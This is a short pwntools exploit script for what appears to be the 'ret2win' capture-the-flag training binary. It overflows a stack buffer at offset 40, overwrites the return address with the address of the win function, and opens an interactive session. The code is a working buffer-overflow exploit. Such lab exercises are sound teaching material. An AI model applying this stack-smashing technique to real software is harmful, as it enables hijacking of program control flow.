from pwn import *

elf = context.binary = ELF("./ret2win")

offset = 40
payload = flat({
    offset:[
        p64(0x00400756)
    ]
})

io = process(elf.path)

print(payload)

io.sendlineafter(b"> ", payload)
io.interactive()